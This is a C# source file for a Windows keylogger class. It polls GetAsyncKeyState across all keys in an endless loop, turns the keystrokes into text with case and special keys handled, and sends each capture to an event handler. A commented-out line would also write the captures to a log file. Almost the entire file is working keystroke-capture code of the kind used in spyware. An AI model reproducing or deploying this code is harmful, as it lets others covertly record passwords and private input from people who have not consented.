﻿using System.Net.Security;
using WinApi;

namespace KL
{
    internal static class KeyLogger
    {
        // -------------------------------
        public delegate void KeyHandler(string key);
        public static event KeyHandler? KeyEvent;
        //--------------------------------
        static Dictionary<Keys, string> KeyValues = new Dictionary<Keys, string>()
        {
            { Keys.Space, " " },
            { Keys.Tab, "TAB" },
            { Keys.Enter, "Enter" },
            { Keys.Back, "BACK" },
            { Keys.ControlKey, "CTRL" },
            { Keys.Escape, "ESC" },
            { Keys.CapsLock, "CAP" },
            { Keys.LButton, "LEFTBUTTON" },
            { Keys.RButton, "RIGHBUTTON" },
            { Keys.MButton, "MBUTTON" }
        };

        // -------------------------------
        static bool IsUpper()
        {
            if (Console.CapsLock || Control.ModifierKeys == Keys.Shift)
                return true;

            return false;
        }

        // -------------------------------
        static public void Logic()
        {
            string buffer = "";

            while (true) 
            {
                Thread.Sleep(100);

                for (int i = 0; i < 256; i++)
                {
                    int state = WinApiWrapper.GetAsyncKeyState(i);
                    Keys key = (Keys)i;
                    
                    if (state != 0)
                    {
                        if (KeyValues.ContainsKey(key))
                        {
                            buffer += KeyValues[key];
                        }

                        if (key.ToString().Length == 1)
                        {
                            buffer += IsUpper()
                                ? key.ToString().ToUpper()
                                : key.ToString().ToLower();
                        }

                        if (key.ToString().Length == 2 && char.IsDigit(key.ToString(), 1))
                        {
                            buffer += key.ToString()[1];
                        }

                     //   File.AppendAllText("log.txt", buffer);
                        KeyEvent?.Invoke(buffer);
                        buffer = "";
                        

                    }
                }
            }
        }
    }
}
